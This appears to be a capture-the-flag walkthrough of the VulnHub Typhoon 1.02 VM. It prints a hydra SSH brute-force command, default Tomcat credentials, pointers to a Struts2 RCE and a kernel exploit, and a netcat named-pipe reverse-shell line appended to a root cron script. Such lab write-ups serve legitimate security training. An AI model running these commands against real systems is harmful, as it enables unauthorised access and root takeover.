This post documents the complete walkthrough of Typhoon: 1.02, a boot2root VM created by PRISMA CSI, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.

Background
Typhoon VM contains several vulnerabilities and configuration errors. Typhoon can be used to test vulnerabilities in network services, configuration errors, vulnerable web applications, password cracking attacks, privilege escalation attacks, post exploitation steps, information gathering and DNS attacks.
Information Gathering
Letâs start with a nmap scan to establish the available services in the host.

Whoa. They are not lying when they say Typhoon is a vulnerable VM. Will you look at the MongoDB enumeration??!!
Low-privilege Shell
As the saying âall roads lead to Romeâ goes, there are a couple of ways to get a low-privilege shell. Iâll take the path of least resistance.
From the nmap scan above, you can see that thereâs one disallowed entry in robots.txtâ/mongoadmin.



Moving on to that directory, youâll see a web interface for administering the exposed Mongo instance at 27017/tcp.
Itâs a no-brainer actually. A few clicks later, youâll see the credentials of a SSH account.



With that, we can proceed to get our low-privilege shell.



Boom. Iâm in.
If you prefer the longer route, you can also try out the following steps:

Brute-force SSH with hydra + rockyou:

hydra -l admin -P /usr/share/wordlists/rockyou.txt -t4 ssh://192.168.30.129
The password is metallica 



Tomcatâs manager webapp at 8080/tcp:

Location is /manager/html

Username: tomcat, Password: tomcat

Deploy a malicious webapp described here



Struts2 Showcase:

Thereâs a remote code execution vulnerability with Struts2 Showcase as per CVE-2017-9791

The vulnerability is with the Struts1 integration at /integration/editGangster

I wrote about how to exploit it here




Privilege Escalation
Once you have obtained a low-privilege shell, the next step is to escalate privilege to root. Again, Iâll take the path of least resistance.
During your enumeration, youâll notice a strange-looking script at /tab/script.sh.



If I had to guess, I would say the script is ran as a cron job by root. Thatâs our ticket to a root shell. We can probably use nc to send a reverse shell back to us. However, the nc on the machine doesnât have -e option.
No problem. We can still do something like this.
On one hand, open a nc listener at your attacking machine. On the other hand, append the following command to /tab/script.sh:
echo 'rm -rf /tmp/p; mknod /tmp/p p; /bin/bash 0&lt;/tmp/p | nc 192.168.30.128 1234 &gt;/tmp/p' &gt;&gt; /tab/script.sh
Youâll see the root shell in a bit at the nc listener like so.



Again, there are other ways to get root:


admin can sudo as root with sudo -s

Linux Kernel 3.13.0 &lt; 3.19 - âoverlayfsâ Local Privilege Escalation as per EDB-ID 37292


Root Flag
The last step is to get the root flag as proof that you have rooted the machine.




Afterthought
Iâm sure this is not exhaustive. Kudos to PRISMA CSI for creating this VM. No better way to learn than hands-on practice.
